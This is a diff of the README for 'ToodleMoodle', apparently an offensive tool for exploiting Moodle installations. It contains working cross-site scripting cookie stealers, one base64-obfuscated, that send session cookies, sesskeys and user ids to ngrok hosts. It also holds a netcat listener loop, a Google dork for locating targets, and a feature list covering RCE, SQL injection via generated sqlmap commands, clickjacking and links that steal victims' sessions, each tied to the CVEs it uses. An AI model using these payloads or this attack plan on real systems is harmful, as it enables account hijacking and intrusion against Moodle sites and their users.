@@ -1,4 +1,4 @@
-# toodlemoodle
+# ToodleMoodle
 
 TODO: Write a description here
 
@@ -7,6 +7,7 @@ TODO: Write a description here
 TODO: Write installation instructions here
 
 ## Usage
+
 Google dork: This files describes API changes in core libraries and APIs inurl:lib/upgrade.txt
 
 TODO: Write usage instructions here
@@ -15,9 +16,11 @@ https://docs.moodle.org/dev/Security:Cross-site_scripting
 while true; do nc -l 9999; done
 
 My cookie stealer:
-<script>alert('xss');document.write('<img src="https://7ea30092.ngrok.io/?cookie=' + document.cookie + '" />')</script>
 
+``` html
+<script>alert('xss');document.write('<img src="https://7ea30092.ngrok.io/?cookie=' + document.cookie + '" />')</script>
 <script>document.write('<img src="https://7ea30092.ngrok.io/?session=' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "&sesskey=" + M.cfg.sesskey + "&id=" + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid") + '" />')</script>
+```
 
 https://blog.innerht.ml/tag/clickjacking/ good demo of a button that follows the mouse.
 
@@ -38,31 +41,25 @@ or if eval is filtered:
 
 "onload="new Function(window.atob('ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKSkuc3JjPSgnaHR0cHM6Ly81ZmM0MThlMi5uZ3Jvay5pby8/c2Vzc2lvbj0nLmNvbmNhdChkb2N1bWVudC5jb29raWUsJ3wnLE0uY2ZnLnNlc3NrZXkpKQ=='))()
 
+The vulnerabilities we use are:
 
-https://moodle.org/mod/forum/discuss.php?d=384011 3.6 (fresh!) enum events
-
-https://www.cvedetails.com/cve/CVE-2017-2641/ used by exploit below
-
-https://www.exploit-db.com/exploits/41828 3.2.1 SQL injection implemented
-
-https://www.exploit-db.com/exploits/46551 3.4.1 RCE, CVE below TODO
-
-https://www.cvedetails.com/cve/CVE-2018-1133/ 3.4.2 remote code exec for teacher "Calculated question"
-
-fresher:
-
-https://www.cvedetails.com/cve/CVE-2018-14630/ 3.5.2 remote code exec for (teacher?) "quiz import" probably wont be done
+* Dashboard XSS CVE-2019-3847
+* Assignment XSS CVE-2017-2578
+* SQL Injection / Privilege escalation CVE-2017-2641
+* RCE (must be teacher) CVE-2018-1133
+* RCE (attacker needs permissions to create a quiz or at least be able to import questions)
+CVE-2018-14630
 
 https://packetstormsecurity.com/files/149426/Moodle-3.x-PHP-Unserialize-Remote-Code-Execution.html CVE-2018-14630
 
 Features:
-1. scan: detect version (working!), suggest supported exploits
-2. view calendar events bypass
-3. exploit quiz import and calculated question vulns
-4. exploit 2018-1133 RCE
-5. exploit 2017-2641 SQL injection (via user pref) (generate sqlmap command)
-6. add xss to account dashboard, generate clickjacker, using CVE-2019-3810 or CVE-2019-3847 to hijack session
-7. add xss to calendar, generate link for victim to click and steal sesh
+
+* Scan: the tool can detect version and suggest supported exploits
+* Exploit RCE 2018-1133 and CVE-2018-14630
+* Exploit 2017-2641 SQL injection (via user pref) (generate sqlmap command)
+* Add XSS to account dashboard, generate clickjacker, using CVE-2019-3847 to hijack
+session
+* Add XSS to calendar, generate link for victim to click and steal session
 
 ## Development
 
@@ -106,5 +103,5 @@ Use the  --release flag for an optimized production build.
 
 ## Contributors
 
-- [Riccaardo Felluga](https://github.com/riccardofelluga) - contributor and maintainer
+- [Riccardo Felluga](https://github.com/riccardofelluga) - contributor and maintainer
 - [Claudio Spiess](https://github.com/your-github-user) - creator and maintainer
